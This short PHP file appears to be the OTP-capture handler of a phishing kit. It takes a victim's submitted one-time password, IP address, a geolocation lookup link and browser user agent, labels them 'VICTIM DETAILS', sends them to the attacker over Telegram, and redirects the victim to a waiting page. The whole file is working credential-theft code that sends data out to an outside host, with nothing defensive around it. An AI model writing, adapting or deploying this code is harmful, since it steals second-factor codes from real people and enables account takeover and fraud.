<?php
require_once('tgrm.php');
$IP = getenv("REMOTE_ADDR");
$message .= "/---------------- OTP ----------------/\n";
$message .= " [ OTP1 ] : [  ".$_POST['pass']." ] \n";
$message .= "/---------------- VICTIM DETAILS ----------------/\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";

telegram_send(urlencode($message));

header("Location: ../wait.php");
?>